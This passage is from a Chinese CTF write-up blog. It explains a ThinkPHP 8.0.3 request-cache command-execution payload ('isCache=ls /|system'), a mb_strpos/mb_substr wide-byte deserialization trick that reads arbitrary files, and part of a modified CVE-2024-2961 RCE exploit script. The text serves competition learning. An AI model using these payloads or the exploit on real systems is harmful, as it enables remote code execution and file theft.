punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'cache is enabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Welcome ,cache is disabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目的应该是要控制<code>file_put_contents</code>写入文件，而这里的逻辑只是更新了一次config下的router.php，嗯？</p><p>弄了个不存在的路由报错，得知版本是tp8.0.3</p><p>官方文档里是这么描述的：<a href="https://doc.thinkphp.cn/v8_0/request_cache.html">https://doc.thinkphp.cn/v8_0/request_cache.html</a></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707220747986.png" alt="image-20240707220747986"></p><p>config&#x2F;route.php下的描述：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 是否开启请求缓存 true自动缓存 支持设置请求缓存规则</span><span class="token string single-quoted-string">'request_cache_key'</span>     <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看不懂，啥叫支持设置请求缓存规则，我们看看官方怎么支持的，直接翻对应的中间件</p><p>&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;CheckRequestCache.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 读取当前地址的请求缓存信息 * @access protected * @param Request $request * @param mixed   $key * @return null|string */</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">parseCacheKey</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 关闭当前缓存</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 自动缓存功能</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 特殊规则替换</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__CONTROLLER__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__ACTION__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">controller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$item</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'['</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">ext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">']'</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 缓存某个后缀的请求</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221047385.png" alt="image-20240707221047385"></p><p>发现最底下<code>$key = $fun($key)</code>这两个参数没做过滤直接裸奔了</p><p>然后 $key 对应的就是上面配置选项的键值，而 $fun 是从下面这段来的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即键值以<code>|</code>分隔符，前面的为$key，后面的为$fun</p><p>那么就有payload了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行两次，第一次写入配置，第二次就能回显结果了</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221607769.png" alt="image-20240707221607769"></p><p>注意写入配置是一次性的操作，想要再次执行其他命令就得重启靶机，除非弹shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>cat <span class="token operator">/</span><span class="token number">000</span>f1ag<span class="token operator">.</span><span class="token class-name">txt</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h2><p>前有污染，竟然是原题！</p><p>见：<a href="https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted">https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted</a></p><hr><h2 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h2><blockquote><p>mb_strpos与mb_substr执行差异 + CVE-2024-2961</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">read_file</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token string single-quoted-string">'What you are reading is:'</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$readfile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">read_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$read</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"I_want_to_Read_flag"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$read</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$readfile</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Start_Funny_CTF!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微审一下，可以知道我们需要控制<code>$read.&quot;[&quot;.serialize($readfile).&quot;]&quot;</code>，然后在后面的反序列化中覆盖<code>$filename</code></p><p>先本地起一个环境测试一下</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706192755440.png" alt="image-20240706192755440"></p><p>那么问题很明显在怎么绕过<code>substrstr</code>的截取，因为read有正则过滤所以不能直接输入<code>[</code>、<code>]</code></p><p>问题不大，我们可以直接在start这里输入<code>[</code>、<code>]</code>，这样构造出来的序列化字符串里面就有中括号，因为<code>[</code>一定是在开头处，那么我们要控制的就是<code>]</code>的位置</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706193559961.png" alt="image-20240706193559961"></p><p>我们要构造：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">gxngxngxn<span class="token string double-quoted-string">";s:8:"</span>filename<span class="token string double-quoted-string">";s:5:"</span><span class="token operator">/</span>flag"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这样子明显不行，这之间没有字符的差距</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706194328071.png" alt="image-20240706194328071"></p><h3 id="宽字节漏洞"><a href="#宽字节漏洞" class="headerlink" title="宽字节漏洞"></a>宽字节漏洞</h3><p>这个时候突然想起来<code>mb_strpos</code>与<code>mb_substr</code>执行差异产生的宽字节漏洞</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706211046282.png" alt="image-20240706211046282"></p><p>成功控制前面的部分，那就可以直接把前面多余的部分全部用<code>%f0%9f</code>覆盖掉即可，每次可以覆盖掉两个字母</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706212236113.png" alt="image-20240706212236113"></p><p>本地测试成功，注意我的start开头是多了个字符进行配平成2的倍数的</p><p>那么payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"read_file"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来的问题就是找flag，测试发现<code>php://input</code>用不了，环境变量也删了</p><h3 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h3><p>尝试打CVE-2024-2961，此事在我的<a href="https://c1oudfl0w0.github.io/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/">CVE-2024-2961复现</a>中亦有记载</p><p>自己改exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        path_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        params1<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"?start=O:9:%22read_file%22:2:%7Bs:5:%22start%22;s:9:%22gxngxngxn%22;s:8:%22filename%22;s:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path_length<span class="token punctuation">&#125;</span></span><span class="token string">:%22</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">%22;%7D'"</span></span>        params2<span class="token operator">=</span><span class="token string">"&amp;read=%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9f"</span>        url<span class="token operator">=</span>self<span class="token punctuation">.</span>url<span class="token operator">+</span>params1<span class="token operator">+</span>params2        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># for key, value in params.items():</span>        <span class="token comment">#     print(f"&#123;key&#125;: &#123;value&#125;")</span>        <span class="token comment">#print(response.text)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># print(data)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file 